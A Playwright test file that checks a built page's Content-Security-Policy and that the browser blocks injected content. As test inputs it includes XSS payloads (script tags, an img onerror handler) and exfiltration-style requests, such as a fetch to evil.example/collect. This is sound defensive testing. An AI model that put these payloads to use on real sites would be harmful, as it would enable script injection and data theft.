/**
 * Browser tests for the Content-Security-Policy of docs/SPEC.md 2.3: the
 * built page carries it, its hashes match the page's inline script and
 * style, the page works under it, and the browser enforces it. No test
 * reaches the network.
 */
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { expect, test } from "@playwright/test";

const BUILT = join(__dirname, "..", "dist", "index.html");
const html = readFileSync(BUILT, "utf8");
const sha = (text: string) =>
  `'sha256-${createHash("sha256").update(text.replace(/\r\n?/g, "\n")).digest("base64")}'`;

/** The inline blocks as a browser reads them: the text between the tags. */
const scripts = [...html.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/g)];
const styles = [...html.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/g)];
const policy = /<meta http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(html)?.[1] ?? "";

test.describe("the built page's Content-Security-Policy (2.3)", () => {
  test("is one <meta> tag after <meta charset> and before any script, style or link", () => {
    expect(html.match(/<meta http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
    const tag = html.indexOf('<meta http-equiv="Content-Security-Policy"');
    expect(tag).toBeGreaterThan(html.indexOf("<meta charset="));
    for (const later of ["<script", "<style", "<link"]) {
      expect(tag, later).toBeLessThan(html.indexOf(later));
    }
  });

  test("has the hash of the one inline script and of the one inline style", () => {
    expect(scripts).toHaveLength(1);
    expect(styles).toHaveLength(1);
    expect(policy).toContain(`script-src ${sha(scripts[0]?.[1] ?? "")};`);
    expect(policy).toContain(`style-src ${sha(styles[0]?.[1] ?? "")};`);
  });

  test("allows no inline code, no eval and no host but GitHub's two", () => {
    expect(policy).toMatch(/^default-src 'none'; /);
    // Fonts from data: only: the page's own, inlined by the build (3.12).
    expect(policy).toContain("; font-src data:; ");
    expect(policy).not.toContain("unsafe-");
    expect(policy).toContain(
      "connect-src https://api.github.com https://raw.githubusercontent.com;",
    );
    expect(policy).toContain("base-uri 'none'");
    expect(policy).toContain("form-action 'none'");
  });

  test("the page has no style attribute and no event handler attribute", () => {
    const markup = html
      .replace(/<script\b[\s\S]*?<\/script>/g, "<script></script>")
      .replace(/<style\b[\s\S]*?<\/style>/g, "<style></style>");
    expect(markup).not.toMatch(/<[a-z][^>]*\s(?:style|on[a-z]+)\s*=/i);
  });
});

test.describe("the browser enforces it", () => {
  /**
   * Watches requests to a host the policy does not allow. Chromium may report (as "csp")
   * such a request and then fail it; what must never
   * happen is that one gets an answer.
   */
  function watchEvil(page: import("@playwright/test").Page) {
    const seen: string[] = [];
    const finished: string[] = [];
    const failures: string[] = [];
    page.on("request", (r) => r.url().includes("evil.example") && seen.push(r.url()));
    page.on("requestfinished", (r) => r.url().includes("evil.example") && finished.push(r.url()));
    page.on(
      "requestfailed",
      (r) => r.url().includes("evil.example") && failures.push(r.failure()?.errorText ?? ""),
    );
    return { seen, finished, failures };
  }

  /** Records every policy violation the page reports. */
  async function watchViolations(page: import("@playwright/test").Page) {
    await page.addInitScript(() => {
      const seen: string[] = [];
      (window as unknown as { __violations: string[] }).__violations = seen;
      document.addEventListener("securitypolicyviolation", (e) => seen.push(e.violatedDirective));
    });
    return () =>
      page.evaluate(() => (window as unknown as { __violations: string[] }).__violations);
  }

  test("the page loads and works with no violation and no console error", async ({ page }) => {
    const problems: string[] = [];
    page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
    page.on("pageerror", (e) => problems.push(e.message));
    const violations = await watchViolations(page);
    await page.goto("/");
    await expect(page.locator("#url-input")).toBeVisible();
    await page.locator("#url-input").fill("not an address");
    await page.locator("#open-url").click();
    await expect(page.locator("#message")).toContainText(
      "Type the repository as <owner>/<repo>, for example fomo-t/fomo-f",
    );
    // The redesigned start page with its panel and token guide opened (3.12).
    await page.locator("#private-repos-toggle").click();
    await page.locator("#token-guide-toggle").click();
    await expect(page.locator("#token-guide-body")).toBeVisible();
    expect(await violations()).toEqual([]);
    expect(problems).toEqual([]);
  });

  test("the page's own fonts load under it, with no violation (3.12)", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");
    const faces = await page.evaluate(async () => {
      await document.fonts.ready;
      for (const w of [400, 600, 700]) await document.fonts.load(`${w} 16px Inter`);
      return [...document.fonts]
        .filter((f) => f.family.replace(/["']/g, "") === "Inter")
        .map((f) => [f.weight, f.status])
        .sort();
    });
    expect(faces).toEqual([
      ["400", "loaded"],
      ["600", "loaded"],
      ["700", "loaded"],
    ]);
    expect(await violations()).toEqual([]);
  });

  test("a font from another host, added at run time, is blocked", async ({ page }) => {
    const evil = watchEvil(page);
    const violations = await watchViolations(page);
    await page.goto("/");
    const status = await page.evaluate(async () => {
      const face = new FontFace("Evil", "url(https://evil.example/evil.woff2)");
      document.fonts.add(face);
      try {
        await face.load();
      } catch {
        // A blocked font fails to load.
      }
      return face.status;
    });
    expect(status).toBe("error");
    await expect.poll(violations).toContain("font-src");
    expect(evil.finished).toEqual([]);
  });

  test("a stylesheet added at run time is blocked", async ({ page }) => {
    const evil = watchEvil(page);
    const violations = await watchViolations(page);
    await page.goto("/");
    await page.evaluate(() => {
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = "https://evil.example/evil.css";
      document.head.append(link);
      const style = document.createElement("style");
      style.textContent =
        "@font-face { font-family: Evil2; src: url(https://evil.example/x.woff2); } body { display: none; }";
      document.head.append(style);
    });
    await expect.poll(violations).toContain("style-src-elem");
    expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe("none");
    expect(evil.finished).toEqual([]);
  });

  test("the page also loads and works under it when opened from disk (file://)", async ({
    page,
  }) => {
    const violations = await watchViolations(page);
    await page.goto(pathToFileURL(BUILT).href);
    await page.locator("#url-input").fill("not an address");
    await page.locator("#open-url").click();
    await expect(page.locator("#message")).toContainText(
      "Type the repository as <owner>/<repo>, for example fomo-t/fomo-f",
    );
    expect(await violations()).toEqual([]);
  });

  test("a loaded project with its branch picker shown: no violation and no console error (3.13)", async ({
    page,
  }) => {
    const problems: string[] = [];
    page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
    page.on("pageerror", (e) => problems.push(e.message));
    const violations = await watchViolations(page);
    const cors = { "access-control-allow-origin": "*" };
    await page.route(/^https:\/\/(api\.github\.com|raw\.githubusercontent\.com)\//, (route) => {
      const url = route.request().url();
      if (url === "https://api.github.com/repos/acme/widgets")
        return route.fulfill({ status: 200, headers: cors, body: '{"default_branch":"main"}' });
      if (url.includes("/branches?"))
        return route.fulfill({
          status: 200,
          headers: cors,
          body: '[{"name":"main"},{"name":"dev"}]',
        });
      if (url.includes("/git/trees/"))
        return route.fulfill({
          status: 200,
          headers: cors,
          body: '{"truncated":false,"tree":[{"path":"BACKLOG.md","type":"blob"}]}',
        });
      return route.fulfill({ status: 200, headers: cors, body: "- **[NOW] A-1** — One." });
    });
    await page.goto("/");
    await page.locator("#url-input").fill("https://github.com/acme/widgets");
    await page.locator("#open-url").click();
    await expect(page.locator("#branch-select option")).toHaveText(["main (default)", "dev"]);
    await expect(page.locator("#branch-picker")).toBeVisible();
    expect(await violations()).toEqual([]);
    expect(problems).toEqual([]);
  });

  test("included entries shown, markup in an included description as text: no violation and no console error (3.15)", async ({
    page,
  }) => {
    const problems: string[] = [];
    page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
    page.on("pageerror", (e) => problems.push(e.message));
    const violations = await watchViolations(page);
    const cors = { "access-control-allow-origin": "*" };
    const included = [
      "## Old",
      "- **[DONE] AB-2** — Hostile. <script>window.__pwned = 1</script>",
      "  <img src=x onerror=window.__pwned=2> and more.",
    ].join("\n");
    await page.route(/^https:\/\/(api\.github\.com|raw\.githubusercontent\.com)\//, (route) => {
      const url = route.request().url();
      if (url === "https://api.github.com/repos/acme/widgets")
        return route.fulfill({ status: 200, headers: cors, body: '{"default_branch":"main"}' });
      if (url.includes("/branches?"))
        return route.fulfill({ status: 200, headers: cors, body: '[{"name":"main"}]' });
      if (url.includes("/git/trees/"))
        return route.fulfill({
          status: 200,
          headers: cors,
          body: '{"truncated":false,"tree":[{"path":"BACKLOG.md","type":"blob"},{"path":"OLD.md","type":"blob"}]}',
        });
      if (url.endsWith("/OLD.md"))
        return route.fulfill({ status: 200, headers: cors, body: included });
      return route.fulfill({
        status: 200,
        headers: cors,
        body: "- **[NOW] AB-1** — One.\n<!-- vizi:include OLD.md -->",
      });
    });
    await page.goto("/");
    await page.locator("#url-input").fill("https://github.com/acme/widgets");
    await page.locator("#open-url").click();
    const done = page.locator('[data-testid="column"][data-marker="DONE"]');
    await done.locator(":scope > summary").click();
    const card = page.locator('[data-testid="card"][data-id="AB-2"]');
    await expect(card.locator(".entry-file")).toHaveText("OLD.md");
    await card.locator("summary").click();
    await expect(card).toContainText("<script>window.__pwned = 1</script>");
    await expect(card.getByTestId("description")).toContainText(
      "<img src=x onerror=window.__pwned=2>",
    );
    await expect(page.locator("#board script, #board img")).toHaveCount(0);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBe(
      undefined,
    );
    await page.getByRole("tab", { name: "List" }).click();
    await expect(page.getByTestId("list-group")).toHaveText(["(no heading)", "Old — OLD.md"]);
    expect(await violations()).toEqual([]);
    expect(problems).toEqual([]);
  });

  test("the opening guide's datalist and select shown: no violation and no console error (3.1, PBI-1.19)", async ({
    page,
  }) => {
    const problems: string[] = [];
    page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
    page.on("pageerror", (e) => problems.push(e.message));
    const violations = await watchViolations(page);
    const cors = { "access-control-allow-origin": "*" };
    await page.route(/^https:\/\/(api\.github\.com|raw\.githubusercontent\.com)\//, (route) => {
      const url = route.request().url();
      if (url === "https://api.github.com/users/acme")
        return route.fulfill({ status: 200, headers: cors, body: '{"type":"Organization"}' });
      if (url.startsWith("https://api.github.com/orgs/acme/repos?"))
        return route.fulfill({
          status: 200,
          headers: cors,
          body: '[{"name":"widgets"},{"name":"gadgets"}]',
        });
      return route.fulfill({ status: 404, headers: cors, body: "" });
    });
    await page.goto("/");
    await page.locator("#url-input").pressSequentially("acme/");
    await expect(page.locator("#repo-list option")).toHaveCount(2);
    await page.locator("#url-input").fill("acme");
    await page.locator("#access-line").click();
    await expect(page.locator("#guide-select")).toBeVisible();
    expect(await violations()).toEqual([]);
    expect(problems).toEqual([]);
  });

  test("the Umbrella tab open with its help text: no violation and no console error (3.9, PBI-1.18)", async ({
    page,
  }) => {
    const problems: string[] = [];
    page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
    page.on("pageerror", (e) => problems.push(e.message));
    const violations = await watchViolations(page);
    const cors = { "access-control-allow-origin": "*" };
    await page.route(/^https:\/\/(api\.github\.com|raw\.githubusercontent\.com)\//, (route) => {
      const url = route.request().url();
      if (url === "https://api.github.com/repos/acme/hub")
        return route.fulfill({ status: 200, headers: cors, body: '{"default_branch":"main"}' });
      if (url.includes("/branches?"))
        return route.fulfill({ status: 200, headers: cors, body: '[{"name":"main"}]' });
      if (url.includes("/git/trees/"))
        return route.fulfill({
          status: 200,
          headers: cors,
          body: '{"truncated":false,"tree":[{"path":"PROJECTS.md","type":"blob"}]}',
        });
      return route.fulfill({
        status: 200,
        headers: cors,
        body: "# Projects\n\n- acme/widgets\n- projects/notes/\n",
      });
    });
    await page.goto("/");
    await page.locator("#url-input").fill("https://github.com/acme/hub");
    await page.locator("#open-url").click();
    await expect(page.locator("#umbrella-help")).toBeVisible();
    await expect(page.locator("#umbrella-help code")).toHaveCount(4);
    expect(await violations()).toEqual([]);
    expect(problems).toEqual([]);
  });

  test("a script added to the page at run time does not run", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");
    await page.evaluate(() => {
      const s = document.createElement("script");
      s.textContent = "window.__injected = true";
      document.body.append(s);
    });
    expect(await page.evaluate(() => "__injected" in window)).toBe(false);
    // The browser fires securitypolicyviolation from a queued task, so it may come after evaluate returns.
    await expect.poll(violations).toContain("script-src-elem");
  });

  test("a style attribute set at run time has no effect", async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto("/");
    const display = await page.evaluate(() => {
      const el = document.createElement("div");
      el.setAttribute("style", "display:none");
      document.body.append(el);
      return getComputedStyle(el).display;
    });
    expect(display).toBe("block");
    await expect.poll(violations).toContain("style-src-attr");
  });

  test("a request to another host is blocked before it is made", async ({ page }) => {
    const evil = watchEvil(page);
    const violations = await watchViolations(page);
    await page.goto("/");
    const outcome = await page.evaluate(async () => {
      try {
        await fetch("https://evil.example/collect?x=1");
        return "sent";
      } catch {
        return "blocked";
      }
    });
    expect(outcome).toBe("blocked");
    await expect.poll(violations).toContain("connect-src");
    expect(evil.finished).toEqual([]);
    expect(evil.failures.every((t) => t === "csp")).toBe(true);
    expect(evil.failures).toHaveLength(evil.seen.length);
  });

  test("an image from another host and a form post are blocked", async ({ page }) => {
    const evil = watchEvil(page);
    const violations = await watchViolations(page);
    await page.goto("/");
    await page.evaluate(() => {
      const img = document.createElement("img");
      img.src = "https://evil.example/pixel.png";
      document.body.append(img);
    });
    await page.evaluate(() => {
      const f = document.createElement("form");
      f.action = "https://evil.example/post";
      f.method = "post";
      document.body.append(f);
      f.requestSubmit();
    });
    await expect.poll(async () => (await violations()).length).toBeGreaterThanOrEqual(2);
    expect(await violations()).toEqual(expect.arrayContaining(["img-src", "form-action"]));
    expect(evil.finished).toEqual([]);
    expect(evil.failures.every((t) => t === "csp")).toBe(true);
    expect(evil.failures).toHaveLength(evil.seen.length);
  });
});
